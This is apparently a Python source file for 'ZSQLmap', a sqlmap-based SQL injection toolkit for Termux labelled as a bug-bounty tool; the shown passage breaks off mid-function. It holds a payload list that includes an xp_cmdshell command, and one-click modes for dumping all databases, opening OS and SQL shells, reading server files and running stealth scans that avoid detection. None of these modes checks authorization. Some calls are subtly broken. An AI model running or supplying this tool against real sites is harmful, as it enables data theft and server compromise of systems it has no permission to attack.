#!/usr/bin/env python3
"""
ZSQLmap - Advanced SQL Injection Toolkit for Termux
Integrated with Request Bridge for Bug Bounty
"""
import os
import sys
import json
import time
import sqlite3
import requests
import subprocess
import threading
import queue
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs
from colorama import init, Fore, Style
import argparse
import random

# Initialize colorama
init(autoreset=True)

# ========== CONFIGURATION ==========
class Config:
    # Color Scheme
    COLORS = {
        'RED': Fore.RED,
        'GREEN': Fore.GREEN,
        'YELLOW': Fore.YELLOW,
        'BLUE': Fore.BLUE,
        'MAGENTA': Fore.MAGENTA,
        'CYAN': Fore.CYAN,
        'WHITE': Fore.WHITE,
        'RESET': Style.RESET_ALL,
        'BRIGHT': Style.BRIGHT,
        'DIM': Style.DIM
    }

    # SQLmap configurations for Termux
    SQLMAP_PATH = "sqlmap"
    SQLMAP_OPTIONS = {
        'basic': "--batch --random-agent --level=1 --risk=1",
        'standard': "--batch --random-agent --level=3 --risk=2",
        'aggressive': "--batch --random-agent --level=5 --risk=3",
        'stealth': "--batch --random-agent --delay=1 --timeout=10",
        'crawl': "--batch --random-agent --crawl=3",
        'full': "--batch --random-agent --level=5 --risk=3 --dbs --tables --columns",
        'dump': "--batch --random-agent --dump-all",
        'os_shell': "--batch --random-agent --os-shell",
        'sql_shell': "--batch --random-agent --sql-shell"
    }

    # File paths
    OUTPUT_DIR = "zsqlmap_results"
    REQUEST_DIR = "captured_requests"
    DATABASE_FILE = "zsqlmap_audit.db"

    # Threading
    MAX_THREADS = 3  # Termux safe

    # Payloads for quick testing
    SQL_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL --",
        "' AND 1=CONVERT(int, @@version) --",
        "' EXEC xp_cmdshell 'dir' --",
        "' OR 1=1 --",
        "admin' --",
        "1' ORDER BY 1--",
        "1' UNION SELECT 1,2,3--",
        "1' AND SLEEP(5)--"
    ]

# ========== DATABASE MANAGER ==========
class AuditDatabase:
    def __init__(self, db_path=Config.DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path)
        self.create_tables()

    def create_tables(self):
        """Create audit tables"""
        cursor = self.conn.cursor()

        # Main audit table
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            target_url TEXT NOT NULL,
            method TEXT NOT NULL,
            parameters TEXT,
            headers TEXT,
            payload TEXT,
            result TEXT,
            vulnerability_level TEXT,
            sqlmap_command TEXT,
            request_file TEXT,
            response_file TEXT
        )
        """)

        # Vulnerabilities table
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            audit_id INTEGER,
            vulnerability_type TEXT NOT NULL,
            parameter TEXT NOT NULL,
            payload TEXT NOT NULL,
            confidence INTEGER,
            severity TEXT,
            description TEXT,
            proof TEXT,
            FOREIGN KEY (audit_id) REFERENCES audit_logs(id)
        )
        """)

        # Discovery table
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS discoveries (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            audit_id INTEGER,
            discovery_type TEXT NOT NULL,
            data TEXT NOT NULL,
            extracted_at TEXT,
            FOREIGN KEY (audit_id) REFERENCES audit_logs(id)
        )
        """)

        self.conn.commit()

    def log_audit(self, target_url, method, parameters=None, headers=None,
                  payload=None, result=None, vulnerability_level=None,
                  sqlmap_command=None, request_file=None, response_file=None):
        """Log audit entry"""
        cursor = self.conn.cursor()

        cursor.execute("""
        INSERT INTO audit_logs
        (timestamp, target_url, method, parameters, headers, payload, result,
         vulnerability_level, sqlmap_command, request_file, response_file)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            datetime.now().isoformat(),
            target_url,
            method,
            json.dumps(parameters) if parameters else None,
            json.dumps(headers) if headers else None,
            json.dumps(payload) if payload else None,
            result,
            vulnerability_level,
            sqlmap_command,
            request_file,
            response_file
        ))

        self.conn.commit()
        return cursor.lastrowid

    def log_vulnerability(self, audit_id, vuln_type, parameter, payload,
                         confidence, severity, description, proof):
        """Log vulnerability finding"""
        cursor = self.conn.cursor()

        cursor.execute("""
        INSERT INTO vulnerabilities
        (audit_id, vulnerability_type, parameter, payload, confidence,
         severity, description, proof)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            audit_id,
            vuln_type,
            parameter,
            payload,
            confidence,
            severity,
            description,
            proof
        ))

        self.conn.commit()

    def log_discovery(self, audit_id, discovery_type, data):
        """Log discovery (database, tables, etc.)"""
        cursor = self.conn.cursor()

        cursor.execute("""
        INSERT INTO discoveries (audit_id, discovery_type, data, extracted_at)
        VALUES (?, ?, ?, ?)
        """, (
            audit_id,
            discovery_type,
            data,
            datetime.now().isoformat()
        ))

        self.conn.commit()

    def get_audit_history(self, limit=10):
        """Get recent audit history"""
        cursor = self.conn.cursor()

        cursor.execute("""
        SELECT * FROM audit_logs
        ORDER BY timestamp DESC
        LIMIT ?
        """, (limit,))

        return cursor.fetchall()

    def get_vulnerabilities(self):
        """Get all vulnerabilities"""
        cursor = self.conn.cursor()

        cursor.execute("""
        SELECT * FROM vulnerabilities
        ORDER BY severity DESC, confidence DESC
        """)

        return cursor.fetchall()

# ========== REQUEST BRIDGE ==========
class RequestBridge:
    """Bridge for capturing and replaying HTTP requests"""
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        # Create directories
        os.makedirs(Config.REQUEST_DIR, exist_ok=True)
        os.makedirs(Config.OUTPUT_DIR, exist_ok=True)

        self.db = AuditDatabase()

    def capture_request(self, method, url, params=None, data=None, headers=None,
                       cookies=None, files=None, auth=None):
        """Capture HTTP request and save to file for SQLmap"""
        try:
            # Prepare request
            req_headers = self.session.headers.copy()
            if headers:
                req_headers.update(headers)

            # Make request
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=req_headers,
                cookies=cookies,
                files=files,
                auth=auth
            )

            # Save request to file
            request_file = self._save_request_to_file(
                method, url, params, data, req_headers, cookies, files
            )

            # Save response
            response_file = self._save_response_to_file(response)

            # Log to database
            audit_id = self.db.log_audit(
                target_url=url,
                method=method,
                parameters=params if params else (data if isinstance(data, dict) else None),
                headers=dict(req_headers),
                result=f"HTTP {response.status_code}",
                request_file=request_file,
                response_file=response_file
            )

            self._print_status(f"Request captured: {request_file}", "success")

            return {
                'success': True,
                'response': response,
                'request_file': request_file,
                'response_file': response_file,
                'audit_id': audit_id
            }

        except Exception as e:
            self._print_status(f"Request failed: {str(e)}", "error")
            return {'success': False, 'error': str(e)}

    def _save_request_to_file(self, method, url, params, data, headers, cookies, files):
        """Save request to .req file for SQLmap"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{Config.REQUEST_DIR}/request_{timestamp}.req"

        parsed_url = urlparse(url)

        # Build request
        lines = []

        # Request line
        query_string = ""
        if params:
            query_string = "?" + urlencode(params)
        elif parsed_url.query:
            query_string = "?" + parsed_url.query

        path = parsed_url.path + query_string
        lines.append(f"{method} {path} HTTP/1.1")

        # Headers
        lines.append(f"Host: {parsed_url.netloc}")
        for key, value in headers.items():
            lines.append(f"{key}: {value}")

        # Cookies
        if cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            lines.append(f"Cookie: {cookie_str}")

        # Empty line
        lines.append("")

        # Body
        if data:
            if isinstance(data, dict):
                lines.append(urlencode(data))
            else:
                lines.append(str(data))

        # Write to file
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))

        return filename

    def _save_response_to_file(self, response):
        """Save response to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{Config.REQUEST_DIR}/response_{timestamp}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"HTTP/1.1 {response.status_code} {response.reason}\n")
            for key, value in response.headers.items():
                f.write(f"{key}: {value}\n")
            f.write("\n")
            f.write(response.text[:5000])  # Limit size

        return filename

    def quick_sql_test(self, url, method="GET", params=None, data=None):
        """Quick SQL injection test with basic payloads"""
        self._print_status(f"Quick SQL test on {url}", "info")

        test_results = []

        # Test GET parameters
        if method.upper() == "GET" and params:
            for param_name, param_value in params.items():
                for payload in Config.SQL_PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = payload

                    result = self.capture_request(method, url, params=test_params)
                    if result['success']:
                        test_results.append({
                            'parameter': param_name,
                            'payload': payload,
                            'response': result['response'].status_code
                        })

        # Test POST data
        elif method.upper() == "POST" and data:
            if isinstance(data, dict):
                for field_name, field_value in data.items():
                    for payload in Config.SQL_PAYLOADS:
                        test_data = data.copy()
                        test_data[field_name] = payload

                        result = self.capture_request(method, url, data=test_data)
                        if result['success']:
                            test_results.append({
                                'parameter': field_name,
                                'payload': payload,
                                'response': result['response'].status_code
                            })

        return test_results

    def _print_status(self, message, status="info"):
        """Print status with colors"""
        colors = Config.COLORS

        prefixes = {
            "info": f"{colors['BLUE']}[*]{colors['RESET']}",
            "success": f"{colors['GREEN']}[✓]{colors['RESET']}",
            "error": f"{colors['RED']}[✗]{colors['RESET']}",
            "warning": f"{colors['YELLOW']}[!]{colors['RESET']}",
            "found": f"{colors['MAGENTA']}[+]{colors['RESET']}"
        }

        print(f"{prefixes.get(status, prefixes['info'])} {message}")

# ========== SQLMAP ENGINE ==========
class SQLmapEngine:
    """SQLmap integration engine"""
    def __init__(self):
        self.bridge = RequestBridge()
        self.db = AuditDatabase()

        # Check if sqlmap is installed
        self._check_sqlmap()

    def _check_sqlmap(self):
        """Check if sqlmap is installed"""
        try:
            result = subprocess.run(
                ["which", "sqlmap"],
                capture_output=True,
                text=True
            )

            if result.returncode != 0:
                self._print_status("SQLmap not found!", "error")
                self._print_status("Install with: pkg install sqlmap", "info")
                return False

            return True

        except:
            return False

    def run_sqlmap(self, target, mode="basic", extra_options=""):
        """Run SQLmap with specified options"""
        if not self._check_sqlmap():
            return None

        base_options = Config.SQLMAP_OPTIONS.get(mode, Config.SQLMAP_OPTIONS['basic'])
        command = f"{Config.SQLMAP_PATH} -u \"{target}\" {base_options} {extra_options}"

        self._print_status(f"Running SQLmap: {command}", "info")

        # Log command
        audit_id = self.db.log_audit(
            target_url=target,
            method="SQLMAP",
            sqlmap_command=command,
            vulnerability_level=mode
        )

        # Run SQLmap
        try:
            # Create output directory for this scan
            scan_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = f"{Config.OUTPUT_DIR}/scan_{scan_id}"
            os.makedirs(output_dir, exist_ok=True)

            # Add output options
            command += f" --output-dir={output_dir}"

            # Execute
            start_time = time.time()
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # Read output in real-time
            vulnerabilities_found = []
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())

                    # Parse for vulnerabilities
                    if "sqlmap identified" in output.lower():
                        vulnerabilities_found.append(output.strip())

                    # Parse for database info
                    if "available databases" in output.lower():
                        self._parse_database_info(output, audit_id)

            elapsed = time.time() - start_time

            # Update audit log
            self._update_audit_result(audit_id, vulnerabilities_found, elapsed)

            return {
                'success': True,
                'scan_id': scan_id,
                'output_dir': output_dir,
                'vulnerabilities': vulnerabilities_found,
                'elapsed_time': elapsed
            }

        except Exception as e:
            self._print_status(f"SQLmap error: {str(e)}", "error")
            return {'success': False, 'error': str(e)}

    def run_sqlmap_on_request(self, request_file, mode="basic", extra_options=""):
        """Run SQLmap on captured request file"""
        if not os.path.exists(request_file):
            self._print_status(f"Request file not found: {request_file}", "error")
            return None

        base_options = Config.SQLMAP_OPTIONS.get(mode, Config.SQLMAP_OPTIONS['basic'])
        command = f"{Config.SQLMAP_PATH} -r \"{request_file}\" {base_options} {extra_options}"

        self._print_status(f"Running SQLmap on request file: {request_file}", "info")

        # Log command
        audit_id = self.db.log_audit(
            target_url=f"file://{request_file}",
            method="SQLMAP",
            sqlmap_command=command,
            vulnerability_level=mode,
            request_file=request_file
        )

        # Run SQLmap
        try:
            scan_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = f"{Config.OUTPUT_DIR}/scan_{scan_id}"
            os.makedirs(output_dir, exist_ok=True)

            command += f" --output-dir={output_dir}"

            start_time = time.time()
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            vulnerabilities_found = []
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())

                    if "sqlmap identified" in output.lower():
                        vulnerabilities_found.append(output.strip())

                    if "available databases" in output.lower():
                        self._parse_database_info(output, audit_id)

            elapsed = time.time() - start_time

            self._update_audit_result(audit_id, vulnerabilities_found, elapsed)

            return {
                'success': True,
                'scan_id': scan_id,
                'output_dir': output_dir,
                'vulnerabilities': vulnerabilities_found,
                'elapsed_time': elapsed
            }

        except Exception as e:
            self._print_status(f"SQLmap error: {str(e)}", "error")
            return {'success': False, 'error': str(e)}

    def _parse_database_info(self, output, audit_id):
        """Parse database information from SQLmap output"""
        lines = output.strip().split('\n')

        for line in lines:
            line = line.strip()

            if '[*]' in line and 'available databases' in line.lower():
                # Extract database names
                db_info = line.split('[*]')[1].strip()
                self.db.log_discovery(audit_id, "databases", db_info)

            elif '[*]' in line and 'Database:' in line:
                # Extract specific database info
                db_info = line.split('[*]')[1].strip()
                self.db.log_discovery(audit_id, "database_details", db_info)

    def _update_audit_result(self, audit_id, vulnerabilities, elapsed_time):
        """Update audit log with results"""
        if vulnerabilities:
            result = f"Found {len(vulnerabilities)} vulnerabilities in {elapsed_time:.1f}s"

            # Log each vulnerability
            for vuln in vulnerabilities:
                # Parse vulnerability details (simplified)
                if "GET parameter" in vuln:
                    param_start = vuln.find("'") + 1
                    param_end = vuln.find("'", param_start)
                    parameter = vuln[param_start:param_end]

                    self.db.log_vulnerability(
                        audit_id=audit_id,
                        vuln_type="SQL Injection",
                        parameter=parameter,
                        payload="SQLmap detected",
                        confidence=90,
                        severity="High",
                        description=vuln,
                        proof="SQLmap automated detection"
                    )
        else:
            result = f"No vulnerabilities found in {elapsed_time:.1f}s"

    def _print_status(self, message, status="info"):
        """Print status with colors"""
        colors = Config.COLORS

        prefixes = {
            "info": f"{colors['BLUE']}[*]{colors['RESET']}",
            "success": f"{colors['GREEN']}[✓]{colors['RESET']}",
            "error": f"{colors['RED']}[✗]{colors['RESET']}",
            "warning": f"{colors['YELLOW']}[!]{colors['RESET']}",
            "found": f"{colors['MAGENTA']}[+]{colors['RESET']}"
        }

        print(f"{prefixes.get(status, prefixes['info'])} {message}")

# ========== ZSQLMAP MAIN CLASS ==========
class ZSQLmap:
    """Main ZSQLmap application"""
    def __init__(self):
        self.engine = SQLmapEngine()
        self.bridge = RequestBridge()
        self.db = AuditDatabase()

    def print_banner(self):
        """Print ZSQLmap banner"""
        colors = Config.COLORS

        banner = f"""
{colors['CYAN']}╔══════════════════════════════════════════╗{colors['RESET']}
{colors['CYAN']}║{colors['RESET']}    {colors['YELLOW']}ZSQLmap - SQL Injection Toolkit{colors['RESET']}   {colors['CYAN']}║{colors['RESET']}
{colors['CYAN']}║{colors['RESET']}   {colors['DIM']}Advanced SQLi Testing for Termux{colors['RESET']}   {colors['CYAN']}║{colors['RESET']}
{colors['CYAN']}║{colors['RESET']}       {colors['DIM']}Integrated Request Bridge{colors['RESET']}      {colors['CYAN']}║{colors['RESET']}
{colors['CYAN']}╚══════════════════════════════════════════╝{colors['RESET']}
        """
        print(banner)

    def interactive_mode(self):
        """Interactive mode"""
        self.print_banner()

        while True:
            print("\n" + "="*60)
            print(f"{Config.COLORS['CYAN']}[1]{Config.COLORS['RESET']} Quick URL Test")
            print(f"{Config.COLORS['CYAN']}[2]{Config.COLORS['RESET']} Capture & Test Request")
            print(f"{Config.COLORS['CYAN']}[3]{Config.COLORS['RESET']} Smart Automated Testing")
            print(f"{Config.COLORS['CYAN']}[4]{Config.COLORS['RESET']} Test Request File (.req)")
            print(f"{Config.COLORS['CYAN']}[5]{Config.COLORS['RESET']} Database & Tables Enumeration")
            print(f"{Config.COLORS['CYAN']}[6]{Config.COLORS['RESET']} Data Extraction (Dump)")
            print(f"{Config.COLORS['CYAN']}[7]{Config.COLORS['RESET']} Advanced SQLmap Options")
            print(f"{Config.COLORS['CYAN']}[8]{Config.COLORS['RESET']} View Audit History")
            print(f"{Config.COLORS['CYAN']}[9]{Config.COLORS['RESET']} Bug Bounty Workflow")
            print(f"{Config.COLORS['CYAN']}[0]{Config.COLORS['RESET']} Exit")
            print("="*60)

            try:
                choice = input(f"\n{Config.COLORS['YELLOW']}Select option:{Config.COLORS['RESET']} ").strip()

                if choice == "1":
                    self.quick_url_test()
                elif choice == "2":
                    self.capture_and_test()
                elif choice == "3":
                    self.smart_automated_test()
                elif choice == "4":
                    self.test_request_file()
                elif choice == "5":
                    self.enumerate_database()
                elif choice == "6":
                    self.data_extraction()
                elif choice == "7":
                    self.advanced_options()
                elif choice == "8":
                    self.view_audit_history()
                elif choice == "9":
                    self.bug_bounty_workflow()
                elif choice == "0":
                    self._print_status("Goodbye!", "success")
                    break
                else:
                    self._print_status("Invalid choice", "error")

            except KeyboardInterrupt:
                self._print_status("\nInterrupted", "warning")
                break
            except Exception as e:
                self._print_status(f"Error: {str(e)}", "error")

    def quick_url_test(self):
        """Quick SQL injection test on URL"""
        self._print_status("Quick URL Test Mode", "info")

        url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()

        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        # Ask for parameters
        has_params = input(f"{Config.COLORS['YELLOW']}[?] Does URL have parameters? (y/N):{Config.COLORS['RESET']} ").strip().lower()

        params = None
        if has_params == 'y':
            param_input = input(f"{Config.COLORS['YELLOW']}[?] Parameters (format: param1=value1&param2=value2):{Config.COLORS['RESET']} ").strip()
            if param_input:
                params = parse_qs(param_input)
                # Flatten single values
                params = {k: v[0] if len(v) == 1 else v for k, v in params.items()}

        # Choose test mode
        print(f"\n{Config.COLORS['CYAN']}Test Modes:{Config.COLORS['RESET']}")
        print("  1. Basic (Fast)")
        print("  2. Standard (Recommended)")
        print("  3. Aggressive (Slow but thorough)")
        print("  4. Stealth (Avoid detection)")

        mode_choice = input(f"\n{Config.COLORS['YELLOW']}[?] Select mode (1-4):{Config.COLORS['RESET']} ").strip()

        modes = { "1": "basic", "2": "standard", "3": "aggressive", "4": "stealth" }
        mode = modes.get(mode_choice, "standard")

        # Run SQLmap
        self.engine.run_sqlmap(url, mode)

    def capture_and_test(self):
        """Capture HTTP request and test it"""
        self._print_status("Capture & Test Mode", "info")

        print(f"\n{Config.COLORS['CYAN']}Request Options:{Config.COLORS['RESET']}")
        print("  1. Simple GET request")
        print("  2. GET with parameters")
        print("  3. POST request")
        print("  4. POST with JSON")
        print("  5. Manual request file")

        req_choice = input(f"\n{Config.COLORS['YELLOW']}[?] Select option:{Config.COLORS['RESET']} ").strip()

        request_file = None

        if req_choice == "1":
            url = input(f"{Config.COLORS['YELLOW']}[?] URL:{Config.COLORS['RESET']} ").strip()
            result = self.bridge.capture_request("GET", url)
            if result['success']:
                request_file = result['request_file']

        elif req_choice == "2":
            url = input(f"{Config.COLORS['YELLOW']}[?] URL:{Config.COLORS['RESET']} ").strip()

            param_input = input(f"{Config.COLORS['YELLOW']}[?] Parameters (format: param1=value1&param2=value2):{Config.COLORS['RESET']} ").strip()
            params = parse_qs(param_input) if param_input else None
            params = {k: v[0] if len(v) == 1 else v for k, v in params.items()} if params else None

            result = self.bridge.capture_request("GET", url, params=params)
            if result['success']:
                request_file = result['request_file']

        elif req_choice == "3":
            url = input(f"{Config.COLORS['YELLOW']}[?] URL:{Config.COLORS['RESET']} ").strip()

            data_input = input(f"{Config.COLORS['YELLOW']}[?] POST data (format: field1=value1&field2=value2):{Config.COLORS['RESET']} ").strip()
            data = parse_qs(data_input) if data_input else None
            data = {k: v[0] if len(v) == 1 else v for k, v in data.items()} if data else None

            result = self.bridge.capture_request("POST", url, data=data)
            if result['success']:
                request_file = result['request_file']

        elif req_choice == "4":
            url = input(f"{Config.COLORS['YELLOW']}[?] URL:{Config.COLORS['RESET']} ").strip()

            json_input = input(f"{Config.COLORS['YELLOW']}[?] JSON data:{Config.COLORS['RESET']} ").strip()
            try:
                data = json.loads(json_input)
            except:
                data = {"data": json_input}

            headers = {"Content-Type": "application/json"}
            result = self.bridge.capture_request("POST", url, json=data, headers=headers)
            if result['success']:
                request_file = result['request_file']

        elif req_choice == "5":
            request_file = input(f"{Config.COLORS['YELLOW']}[?] Path to .req file:{Config.COLORS['RESET']} ").strip()

        # Test the captured request
        if request_file and os.path.exists(request_file):
            self._print_status(f"Testing request file: {request_file}", "info")

            # Choose test mode
            print(f"\n{Config.COLORS['CYAN']}Test Modes:{Config.COLORS['RESET']}")
            print("  1. Quick test")
            print("  2. Full enumeration")
            print("  3. Data extraction")

            test_choice = input(f"{Config.COLORS['YELLOW']}[?] Select test:{Config.COLORS['RESET']} ").strip()

            if test_choice == "1":
                self.engine.run_sqlmap_on_request(request_file, "basic")
            elif test_choice == "2":
                self.engine.run_sqlmap_on_request(request_file, "full")
            elif test_choice == "3":
                self.engine.run_sqlmap_on_request(request_file, "dump")
            else:
                self.engine.run_sqlmap_on_request(request_file, "standard")
        else:
            self._print_status("No valid request file", "error")

    def smart_automated_test(self):
        """Smart automated testing workflow"""
        self._print_status("Smart Automated Testing", "info")

        url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()

        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        print(f"\n{Config.COLORS['CYAN']}Smart Testing Pipeline:{Config.COLORS['RESET']}")
        print("  1. Quick vulnerability scan")
        print("  2. Crawl and test all links")
        print("  3. Comprehensive audit")

        pipeline = input(f"\n{Config.COLORS['YELLOW']}[?] Select pipeline:{Config.COLORS['RESET']} ").strip()

        if pipeline == "1":
            # Quick scan
            self._print_status("Starting quick scan...", "info")
            self.engine.run_sqlmap(url, "basic")

            # Quick manual test
            test_results = self.bridge.quick_sql_test(url)
            if test_results:
                self._print_status(f"Quick test found {len(test_results)} potential issues", "found")

        elif pipeline == "2":
            # Crawl and test
            self._print_status("Crawling and testing...", "info")
            self.engine.run_sqlmap(url, "crawl")

        elif pipeline == "3":
            # Comprehensive audit
            self._print_status("Starting comprehensive audit...", "info")

            # Step 1: Basic scan
            self.engine.run_sqlmap(url, "basic")

            # Step 2: Standard scan
            continue_scan = input(f"\n{Config.COLORS['YELLOW']}[?] Continue with standard scan? (y/N):{Config.COLORS['RESET']} ").strip().lower()
            if continue_scan == 'y':
                self.engine.run_sqlmap(url, "standard")

            # Step 3: Full enumeration
            continue_enum = input(f"\n{Config.COLORS['YELLOW']}[?] Continue with full enumeration? (y/N):{Config.COLORS['RESET']} ").strip().lower()
            if continue_enum == 'y':
                self.engine.run_sqlmap(url, "full")

    def test_request_file(self):
        """Test existing .req file"""
        self._print_status("Test Request File", "info")

        # List available request files
        req_files = list(Path(Config.REQUEST_DIR).glob("*.req"))

        if not req_files:
            self._print_status("No request files found", "warning")
            return

        print(f"\n{Config.COLORS['CYAN']}Available request files:{Config.COLORS['RESET']}")
        for i, file in enumerate(req_files[:10], 1):
            print(f"  {i:2d}. {file.name}")

        if len(req_files) > 10:
            print(f"  ... and {len(req_files) - 10} more")

        try:
            choice = int(input(f"\n{Config.COLORS['YELLOW']}[?] Select file (1-{min(10, len(req_files))}):{Config.COLORS['RESET']} ").strip())

            if 1 <= choice <= len(req_files):
                request_file = str(req_files[choice - 1])

                # Test options
                print(f"\n{Config.COLORS['CYAN']}Test Options:{Config.COLORS['RESET']}")
                print("  1. Quick test")
                print("  2. Database enumeration")
                print("  3. Tables enumeration")
                print("  4. Data extraction")
                print("  5. OS shell attempt")

                test_choice = input(f"{Config.COLORS['YELLOW']}[?] Select test:{Config.COLORS['RESET']} ").strip()

                if test_choice == "1":
                    self.engine.run_sqlmap_on_request(request_file, "basic")
                elif test_choice == "2":
                    self.engine.run_sqlmap_on_request(request_file, "basic", "--dbs")
                elif test_choice == "3":
                    db_name = input(f"{Config.COLORS['YELLOW']}[?] Database name:{Config.COLORS['RESET']} ").strip()
                    self.engine.run_sqlmap_on_request(request_file, "basic", f"-D {db_name} --tables")
                elif test_choice == "4":
                    db_name = input(f"{Config.COLORS['YELLOW']}[?] Database name:{Config.COLORS['RESET']} ").strip()
                    table_name = input(f"{Config.COLORS['YELLOW']}[?] Table name:{Config.COLORS['RESET']} ").strip()
                    self.engine.run_sqlmap_on_request(request_file, "basic", f"-D {db_name} -T {table_name} --dump")
                elif test_choice == "5":
                    self.engine.run_sqlmap_on_request(request_file, "aggressive", "--os-shell")
                else:
                    self.engine.run_sqlmap_on_request(request_file, "standard")

        except (ValueError, IndexError):
            self._print_status("Invalid selection", "error")

    def enumerate_database(self):
        """Database and tables enumeration"""
        self._print_status("Database Enumeration", "info")

        print(f"\n{Config.COLORS['CYAN']}Enumeration Options:{Config.COLORS['RESET']}")
        print("  1. List databases")
        print("  2. List tables in database")
        print("  3. List columns in table")

        choice = input(f"\n{Config.COLORS['YELLOW']}[?] Select option:{Config.COLORS['RESET']} ").strip()

        if choice == "1":
            url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "standard", "--dbs")

        elif choice == "2":
            url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()
            db_name = input(f"{Config.COLORS['YELLOW']}[?] Database name:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "standard", f"-D {db_name} --tables")

        elif choice == "3":
            url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()
            db_name = input(f"{Config.COLORS['YELLOW']}[?] Database name:{Config.COLORS['RESET']} ").strip()
            table_name = input(f"{Config.COLORS['YELLOW']}[?] Table name:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "standard", f"-D {db_name} -T {table_name} --columns")

    def data_extraction(self):
        """Data extraction (dumping)"""
        self._print_status("Data Extraction", "info")

        url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()
        db_name = input(f"{Config.COLORS['YELLOW']}[?] Database name:{Config.COLORS['RESET']} ").strip()

        print(f"\n{Config.COLORS['CYAN']}Extraction Options:{Config.COLORS['RESET']}")
        print("  1. Dump specific table")
        print("  2. Dump entire database")
        print("  3. Dump all databases")

        choice = input(f"\n{Config.COLORS['YELLOW']}[?] Select option:{Config.COLORS['RESET']} ").strip()

        if choice == "1":
            table_name = input(f"{Config.COLORS['YELLOW']}[?] Table name:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "standard", f"-D {db_name} -T {table_name} --dump")

        elif choice == "2":
            self.engine.run_sqlmap(url, "standard", f"-D {db_name} --dump-all")

        elif choice == "3":
            self.engine.run_sqlmap(url, "standard", "--dump-all")

    def advanced_options(self):
        """Advanced SQLmap options"""
        self._print_status("Advanced Options", "info")

        print(f"\n{Config.COLORS['CYAN']}Advanced Features:{Config.COLORS['RESET']}")
        print("  1. OS shell attempt")
        print("  2. SQL shell attempt")
        print("  3. Read files from server")
        print("  4. Custom SQLmap command")

        choice = input(f"\n{Config.COLORS['YELLOW']}[?] Select option:{Config.COLORS['RESET']} ").strip()

        url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()

        if choice == "1":
            self.engine.run_sqlmap(url, "aggressive", "--os-shell")

        elif choice == "2":
            self.engine.run_sqlmap(url, "aggressive", "--sql-shell")

        elif choice == "3":
            file_path = input(f"{Config.COLORS['YELLOW']}[?] File path to read:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "aggressive", f"--file-read={file_path}")

        elif choice == "4":
            custom_cmd = input(f"{Config.COLORS['YELLOW']}[?] Custom SQLmap options:{Config.COLORS['RESET']} ").strip()
            self.engine.run_sqlmap(url, "basic", custom_cmd)

    def view_audit_history(self):
        """View audit history"""
        self._print_status("Audit History", "info")

        history = self.db.get_audit_history(20)

        if not history:
            self._print_status("No audit history found", "info")
            return

        print(f"\n{Config.COLORS['CYAN']}Recent Audits:{Config.COLORS['RESET']}")
        print("-"*80)
        print(f"{'ID':<4} {'Time':<19} {'Target':<30} {'Method':<8} {'Result':<20}")
        print("-"*80)

        for row in history:
            row_id, timestamp, target, method, params, headers, payload, result, vuln_level, sqlmap_cmd, req_file, resp_file = row

            # Truncate target for display
            target_display = target[:28] + "..." if len(target) > 30 else target
            result_display = result[:18] + "..." if result and len(result) > 20 else (result or "")

            print(f"{row_id:<4} {timestamp[11:19]:<9} {target_display:<30} {method:<8} {result_display:<20}")

        print("-"*80)

        # Show vulnerabilities
        vulnerabilities = self.db.get_vulnerabilities()
        if vulnerabilities:
            print(f"\n{Config.COLORS['CYAN']}Vulnerabilities Found:{Config.COLORS['RESET']}")
            print("-"*80)

            for vuln in vulnerabilities[:5]:  # Show first 5
